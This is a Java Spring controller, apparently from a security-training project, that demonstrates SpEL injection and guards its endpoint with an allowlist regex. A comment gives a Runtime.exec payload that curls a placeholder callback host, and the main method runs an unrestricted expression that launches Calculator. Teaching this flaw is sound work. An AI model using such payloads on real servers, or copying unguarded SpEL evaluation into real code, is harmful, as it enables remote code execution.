package org.joychou.controller;

import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.util.HtmlUtils;

import java.util.regex.Pattern;


/**
 * SpEL Injection
 *
 * @author JoyChou @2019-01-17
 */
@RestController
public class SpEL {

    /**
     * Allowlist pattern: permits only numeric literals, basic arithmetic
     * operators (+, -, *, /, %), parentheses, whitespace, decimal points,
     * simple single-quoted string literals (no nesting), boolean literals,
     * and null. Blocks type references T(), constructors (new), bean
     * references (#, @), property chains, and method invocations that
     * could lead to RCE.
     */
    private static final Pattern SAFE_EXPRESSION_PATTERN = Pattern.compile(
            "^(\\s*(\\d+(\\.\\d+)?|'[^']*'|true|false|null|[+\\-*/%()]|\\s)\\s*)+$"
    );

    /**
     * SpEL to RCE
     * http://localhost:8080/spel/vul/?expression=xxx.
     * xxx is urlencode(exp)
     * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
     */
    @GetMapping("/spel/vuln")
    public String rce(String expression) {
        if (expression == null || expression.isEmpty()) {
            return "Expression cannot be empty";
        }
        // Allowlist validation: only safe literal/arithmetic expressions are permitted.
        // This prevents SpEL injection (RCE via T(), new, bean refs, method calls)
        // without requiring SimpleEvaluationContext (unavailable in Spring 4.x).
        if (!SAFE_EXPRESSION_PATTERN.matcher(expression).matches()) {
            return "Expression rejected: only literals and arithmetic operators are allowed";
        }
        ExpressionParser parser = new SpelExpressionParser();
        return HtmlUtils.htmlEscape(parser.parseExpression(expression).getValue().toString());
    }

    public static void main(String[] args) {
        ExpressionParser parser = new SpelExpressionParser();
        String expression = "T(java.lang.Runtime).getRuntime().exec(\"open -a Calculator\")";
        String result = parser.parseExpression(expression).getValue().toString();
        System.out.println(result);
    }
}

